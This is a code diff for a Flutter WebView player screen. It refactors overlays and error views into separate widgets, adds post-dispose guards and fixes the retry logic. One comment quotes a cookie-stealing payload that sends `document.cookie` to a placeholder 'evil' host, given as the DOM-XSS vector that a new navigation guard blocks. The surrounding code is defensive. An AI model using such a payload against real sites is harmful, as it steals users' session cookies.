+              // `<a href="javascript:void(0)">` as a no-op click target,
+              // so we allow it there — but a main-frame jump to
+              // `javascript:fetch('https://evil/?'+document.cookie)` from
+              // a compromised plugin or hijacked anchor is the textbook
+              // DOM-XSS vector. Cancel it unconditionally.
+              if (navigationAction.isForMainFrame && scheme == 'javascript') {
+                return NavigationActionPolicy.CANCEL;
+              }
               if (scheme.isNotEmpty &&
                   scheme != 'https' &&
                   scheme != 'http' &&
@@ -1688,9 +1099,13 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
                 return NavigationActionPolicy.CANCEL;
               }
 
+              // Use the cached ProviderContainer directly — `ref.read()`
+              // throws under Riverpod 3.x once the widget element starts
+              // unmounting, and on Windows this callback can fire after
+              // the user has already popped the player route.
               final blocklist =
-                  ref.read(adBlocklistProvider).value ??
-                  ref.read(adBlocklistFallbackProvider);
+                  _providerContainer.read(adBlocklistProvider).value ??
+                  _providerContainer.read(adBlocklistFallbackProvider);
               if (blocklist?.isBlocked(url) ?? false) {
                 return NavigationActionPolicy.CANCEL;
               }
@@ -1716,13 +1131,15 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
               }
               return NavigationActionPolicy.ALLOW;
             },
-            shouldInterceptRequest: Platform.isWindows
-                ? null
-                : (controller, request) async {
+            shouldInterceptRequest: PlayerPlatform.useNativeAdBlocking
+                ? (controller, request) async {
+                    // Native side queues callbacks; one may fire after
+                    // dispose. Same rationale as shouldOverrideUrlLoading.
+                    if (_disposed) return null;
                     final url = request.url.toString();
                     final blocklist =
-                        ref.read(adBlocklistProvider).value ??
-                        ref.read(adBlocklistFallbackProvider);
+                        _providerContainer.read(adBlocklistProvider).value ??
+                        _providerContainer.read(adBlocklistFallbackProvider);
                     if (blocklist?.isBlocked(url) ?? false) {
                       return WebResourceResponse(
                         contentType: 'text/plain',
@@ -1730,7 +1147,8 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
                       );
                     }
                     return null;
-                  },
+                  }
+                : null,
           ),
         );
       },
@@ -1740,16 +1158,24 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
   // ─── Progress Bar ─────────────────────────────────────────────────────────
 
   Widget _buildProgressBar() {
-    if (_loadProgress >= 100 || _hasError) return const SizedBox.shrink();
+    if (_hasError) return const SizedBox.shrink();
+    // ValueListenableBuilder so only this widget rebuilds when progress
+    // changes (previously every percent rebuilt the whole player tree).
     return Positioned(
       top: 0,
       left: 0,
       right: 0,
-      child: LinearProgressIndicator(
-        value: _loadProgress / 100,
-        backgroundColor: Colors.white12,
-        valueColor: const AlwaysStoppedAnimation<Color>(AppColors.primary),
-        minHeight: 2,
+      child: ValueListenableBuilder<double>(
+        valueListenable: _loadProgress,
+        builder: (context, progress, _) {
+          if (progress >= 100) return const SizedBox.shrink();
+          return LinearProgressIndicator(
+            value: progress / 100,
+            backgroundColor: Colors.white12,
+            valueColor: const AlwaysStoppedAnimation<Color>(AppColors.primary),
+            minHeight: 2,
+          );
+        },
       ),
     );
   }
@@ -1757,20 +1183,26 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
   // ─── Initial Loading Overlay ──────────────────────────────────────────────
 
   Widget _buildLoadingOverlay() {
+    if (_hasError) return const SizedBox.shrink();
     // Only shown during the very first load (progress ≤ 15%).
     // Wrapped in IgnorePointer so taps pass through to the WebView
     // even while the spinner is visible — fixes laggy play button.
-    if (_hasError || _loadProgress > 15) return const SizedBox.shrink();
-    return IgnorePointer(
-      child: Container(
-        color: Colors.black,
-        child: const Center(
-          child: CircularProgressIndicator(
-            color: AppColors.primary,
-            strokeWidth: 2,
+    return ValueListenableBuilder<double>(
+      valueListenable: _loadProgress,
+      builder: (context, progress, _) {
+        if (progress > 15) return const SizedBox.shrink();
+        return IgnorePointer(
+          child: Container(
+            color: Colors.black,
+            child: const Center(
+              child: CircularProgressIndicator(
+                color: AppColors.primary,
+                strokeWidth: 2,
+              ),
+            ),
           ),
-        ),
-      ),
+        );
+      },
     );
   }
 
@@ -1781,52 +1213,9 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
   /// behaviour without touching `_hasError`/`_errorMsg`, which are owned by
   /// the in-WebView load lifecycle.
   Widget _buildErrorState({String? overrideMessage, VoidCallback? onRetry}) {
-    return Container(
-      color: Colors.black,
-      child: Center(
-        child: Padding(
-          padding: const EdgeInsets.symmetric(horizontal: 32),
-          child: Column(
-            mainAxisSize: MainAxisSize.min,
-            children: [
-              const Icon(
-                Icons.wifi_off_rounded,
-                color: Colors.white38,
-                size: 56,
-              ),
-              const SizedBox(height: 16),
-              const Text(
-                'Failed to load player',
-                style: TextStyle(
-                  color: Colors.white,
-                  fontSize: 18,
-                  fontWeight: FontWeight.w600,
-                ),
-                textAlign: TextAlign.center,
-              ),
-              const SizedBox(height: 8),
-              Text(
-                overrideMessage ?? _errorMsg,
-                style: const TextStyle(color: Colors.white54, fontSize: 13),
-                textAlign: TextAlign.center,
-              ),
-              const SizedBox(height: 24),
-              ElevatedButton.icon(
-                onPressed: onRetry ?? _retry,
-                icon: const Icon(Icons.refresh_rounded),
-                label: const Text('Retry'),
-                style: ElevatedButton.styleFrom(
-                  backgroundColor: AppColors.primary,
-                  foregroundColor: Colors.white,
-                  shape: RoundedRectangleBorder(
-                    borderRadius: BorderRadius.circular(AppSpacing.radiusBase),
-                  ),
-                ),
-              ),
-            ],
-          ),
-        ),
-      ),
+    return PlayerErrorView(
+      message: overrideMessage ?? _errorMsg,
+      onRetry: onRetry ?? _retry,
     );
   }
 
@@ -1834,191 +1223,25 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
 
   Widget _buildNextEpisodeOverlay() {
     if (!_showNextEpisodeOverlay) return const SizedBox.shrink();
-
-    // Use the cached sentinel so we don't allocate a fresh UserProgress (and
-    // a DateTime) on every player-chrome rebuild — see `_nextEpisodeKey`.
-    final nextEpisodeAsync = ref.watch(
-      nextEpisodeForProgressProvider(_nextEpisodeKey),
-    );
-
-    final nextEpisode = nextEpisodeAsync.value;
-    if (nextEpisode == null) return const SizedBox.shrink();
-
-    // Use episode stillPath if available, otherwise fallback to media backdrop.
-    final thumbUrl = buildImageUrl(
-      nextEpisode.stillPath ?? widget.media.backdropPath,
-      AppConfig.backdropSmall,
-    );
-
-    return AnimatedPositioned(
-      duration: const Duration(milliseconds: 600),
-      curve: Curves.easeOutQuart,
-      bottom: 100,
-      right: _overlayActive ? 32 : -400, // Slide in from right
-      child: AnimatedOpacity(
-        duration: const Duration(milliseconds: 500),
-        opacity: _overlayActive ? 1.0 : 0.0,
-        child: MouseRegion(
-          onEnter: (_) => _overlayTimer?.cancel(),
-          onExit: (_) => _startOverlayTimer(),
-          child: Material(
-            color: Colors.transparent,
-            child: Container(
-              width: 380,
-              padding: const EdgeInsets.all(12),
-              decoration: BoxDecoration(
-                color: Colors.black.withValues(alpha: 0.9),
-                borderRadius: BorderRadius.circular(AppSpacing.radiusLg),
-                border: Border.all(color: Colors.white12, width: 1),
-                boxShadow: [
-                  BoxShadow(
-                    color: Colors.black.withValues(alpha: 0.6),
-                    blurRadius: 20,
-                    offset: const Offset(0, 8),
-                  ),
-                ],
-              ),
-              child: Row(
-                children: [
-                  // Episode Thumbnail with Play icon overlay
-                  Stack(
-                    children: [
-                      Container(
-                        width: 140,
-                        height: 80,
-                        decoration: BoxDecoration(
-                          borderRadius: BorderRadius.circular(
-                            AppSpacing.radiusBase,
-                          ),
-                          color: Colors.white10,
-                        ),
-                        clipBehavior: Clip.antiAlias,
-                        child: CachedNetworkImage(
-                          imageUrl: thumbUrl,
-                          fit: BoxFit.cover,
-                          errorWidget: (context, url, error) => const Center(
-                            child: Icon(
-                              Icons.movie_rounded,
-                              color: Colors.white24,
-                            ),
-                          ),
-                        ),
-                      ),
-                      Positioned.fill(
-                        child: Center(
-                          child: Container(
-                            padding: const EdgeInsets.all(8),
-                            decoration: BoxDecoration(
-                              shape: BoxShape.circle,
-                              color: Colors.black.withValues(alpha: 0.4),
-                            ),
-                            child: const Icon(
-                              Icons.play_arrow_rounded,
-                              color: Colors.white,
-                              size: 24,
-                            ),
-                          ),
-                        ),
-                      ),
-                    ],
-                  ),
-                  const SizedBox(width: 16),
-
-                  // Episode Info
-                  Expanded(
-                    child: Column(
-                      mainAxisSize: MainAxisSize.min,
-                      crossAxisAlignment: CrossAxisAlignment.start,
-                      children: [
-                        const Text(
-                          'UP NEXT',
-                          style: TextStyle(
-                            color: AppColors.primary,
-                            fontSize: 11,
-                            fontWeight: FontWeight.w900,
-                            letterSpacing: 1.5,
-                          ),
-                        ),
-                        const SizedBox(height: 4),
-                        Text(
-                          nextEpisode.name,
-                          style: const TextStyle(
-                            color: Colors.white,
-                            fontSize: 16,
-                            fontWeight: FontWeight.bold,
-                          ),
-                          maxLines: 1,
-                          overflow: TextOverflow.ellipsis,
-                        ),
-                        Text(
-                          'S${nextEpisode.seasonNumber} E${nextEpisode.episodeNumber}',
-                          style: const TextStyle(
-                            color: Colors.white70,
-                            fontSize: 13,
-                          ),
-                        ),
-                        const SizedBox(height: 12),
-                        Row(
-                          children: [
-                            Expanded(
-                              child: ElevatedButton(
-                                onPressed: () => _playNextEpisode(
-                                  nextEpisode.seasonNumber,
-                                  nextEpisode.episodeNumber,
-                                ),
-                                style: ElevatedButton.styleFrom(
-                                  backgroundColor: Colors.white,
-                                  foregroundColor: Colors.black,
-                                  padding: const EdgeInsets.symmetric(
-                                    vertical: 8,
-                                  ),
-                                  shape: RoundedRectangleBorder(
-                                    borderRadius: BorderRadius.circular(4),
-                                  ),
-                                  elevation: 0,
-                                ),
-                                child: const Text(
-                                  'Play Next',
-                                  style: TextStyle(fontWeight: FontWeight.bold),
-                                ),
-                              ),
-                            ),
-                            const SizedBox(width: 8),
-                            IconButton(
-                              onPressed: () {
-                                // Also flip _showNextEpisodeOverlay so the
-                                // build short-circuits at the top — leaving
-                                // it `true` keeps `ref.watch` subscribed to
-                                // nextEpisodeForProgressProvider for the rest
-                                // of the session even though the widget is
-                                // off-screen.
-                                _overlayTimer?.cancel();
-                                setState(() {
-                                  _showNextEpisodeOverlay = false;
-                                  _overlayActive = false;
-                                  _dismissedNextEpisodeOverlay = true;
-                                });
-                              },
-                              icon: const Icon(
-                                Icons.close_rounded,
-                                color: Colors.white70,
-                              ),
-                              padding: EdgeInsets.zero,
-                              constraints: const BoxConstraints(),
-                              visualDensity: VisualDensity.compact,
-                              tooltip: 'Dismiss',
-                            ),
-                          ],
-                        ),
-                      ],
-                    ),
-                  ),
-                ],
-              ),
-            ),
-          ),
-        ),
-      ),
+    return NextEpisodeOverlay(
+      progressKey: _nextEpisodeKey,
+      fallbackBackdropPath: widget.media.backdropPath,
+      active: _overlayActive,
+      onPlayNext: _playNextEpisode,
+      onDismiss: () {
+        // Flip _showNextEpisodeOverlay so the next build short-circuits at
+        // the top — leaving it `true` keeps the overlay's
+        // `nextEpisodeForProgressProvider` subscription alive even though
+        // the widget is off-screen.
+        _overlayTimer?.cancel();
+        setState(() {
+          _showNextEpisodeOverlay = false;
+          _overlayActive = false;
+          _dismissedNextEpisodeOverlay = true;
+        });
+      },
+      onHoverEnter: () => _overlayTimer?.cancel(),
+      onHoverExit: _startOverlayTimer,
     );
   }
 
@@ -2083,88 +1306,24 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
   }
 
   Widget _buildWindowActions() {
-    return Positioned(
-      top: 0,
-      left: 50,
-      right: 100,
-      child: AnimatedOpacity(
-        opacity: _showControls ? 1.0 : 0.0,
-        duration: const Duration(milliseconds: 300),
-        child: IgnorePointer(
-          ignoring: !_showControls,
-          child: Row(
-            children: [
-              // Drag area
-              if (Platform.isWindows)
-                Expanded(
-                  child: DragToMoveArea(
-                    child: Container(
-                      height:
-                          60, // Tall enough for dragging but don't block controls
-                      color: Colors.transparent,
-                    ),
-                  ),
-                )
-              else
-                const Spacer(),
-
-              Padding(
-                padding: const EdgeInsets.only(top: 12, right: 16),
-                child: Row(
-                  mainAxisSize: MainAxisSize.min,
-                  children: [
-                    if (Platform.isWindows) ...[
-                      _buildActionButton(
-                        icon: _isFullScreen
-                            ? Icons.fullscreen_exit_rounded
-                            : Icons.fullscreen_rounded,
-                        onTap: _toggleFullScreen,
-                      ),
-                      const SizedBox(width: 8),
-                    ],
-                    _buildActionButton(
-                      icon: Icons.close_rounded,
-                      onTap: _dismiss,
-                    ),
-                  ],
-                ),
-              ),
-              // Buttons
-            ],
-          ),
-        ),
-      ),
-    );
-  }
-
-  Widget _buildActionButton({
-    required IconData icon,
-    required VoidCallback onTap,
-  }) {
-    return SafeArea(
-      child: Material(
-        color: Colors.black54,
-        borderRadius: BorderRadius.circular(AppSpacing.radiusBase),
-        child: InkWell(
-          borderRadius: BorderRadius.circular(AppSpacing.radiusBase),
-          onTap: onTap,
-          child: Padding(
-            padding: const EdgeInsets.all(10),
-            child: Icon(icon, color: Colors.white, size: 20),
-          ),
-        ),
-      ),
+    return PlayerWindowActions(
+      showControls: _showControls,
+      isFullScreen: _isFullScreen,
+      onToggleFullScreen: _toggleFullScreen,
+      onDismiss: _dismiss,
     );
   }
 
   Future<void> _toggleFullScreen() async {
     final isFull = await windowManager.isFullScreen();
     await windowManager.setFullScreen(!isFull);
-    if (mounted) {
-      setState(() {
-        _isFullScreen = !isFull;
-      });
-    }
+    // Intentionally NO setState here — the WindowListener (registered in
+    // initState) updates `_isFullScreen` from `onWindowEnterFullScreen` /
+    // `onWindowLeaveFullScreen` once the OS confirms the transition.
+    // Writing here too would race the listener: if the user toggled
+    // fullscreen externally during the awaits above, the listener would
+    // write the correct value first and our `setState(!isFull)` would
+    // clobber it with the value we captured BEFORE the toggle.
   }
 
   // ─── Actions ──────────────────────────────────────────────────────────────
@@ -2174,7 +1333,7 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
     _isNavigating = true;
 
     try {
-      if (Platform.isWindows) {
+      if (PlayerPlatform.isWindows) {
         await windowManager.setFullScreen(false);
       }
       if (!mounted) {
@@ -2192,10 +1351,51 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
     }
   }
 
+  /// System-back handler — leaves the player AND jumps to /home in one
+  /// step. Uses `context.go('/home')` (not `pop`) so the user lands on
+  /// the app's root regardless of which tab they came from. Pairs with
+  /// the shell's `PopScope` which then arms the "press back again to
+  /// exit" prompt.
+  Future<void> _backToHome() async {
+    if (_isNavigating) return;
+    _isNavigating = true;
+    try {
+      if (PlayerPlatform.isWindows) {
+        await windowManager.setFullScreen(false);
+      }
+      if (!mounted) {
+        _isNavigating = false;
+        return;
+      }
+      context.go('/home');
+    } catch (e) {
+      _isNavigating = false;
+      if (kDebugMode) debugPrint('_backToHome failed: $e');
+    }
+  }
+
   void _retry() {
+    // Reset every piece of latched state that depends on the page-load
+    // lifecycle. The previous implementation only flipped `_hasError`,
+    // leaving the recovery circuit-breaker counter, the per-type cooldown
+    // map, and `_initialLoadComplete` carrying forward — so a user who
+    // tripped the breaker (e.g. SmartScreen loop) could not actually
+    // escape it via the Retry button, and the recovery gates would
+    // misfire as soon as the page started loading again.
+    _loadProgress.value = 0;
+    _recentRecoveries.clear();
+    _lastRecoveryByType.clear();
+    _initialLoadComplete = false;
     setState(() {
       _hasError = false;
-      _loadProgress = 0;
+      _errorMsg = '';
     });
+    // Re-issue the original URL on the existing controller. The widget's
+    // `ValueKey` is bound to `widget.url`, which doesn't change, so the
+    // InAppWebView is reused — without this explicit `loadUrl` it would
+    // keep showing the previously-failed page and Retry would be dead UI.
+    unawaited(
+      _controller?.loadUrl(urlRequest: URLRequest(url: WebUri(widget.url))),
+    );
   }
 }
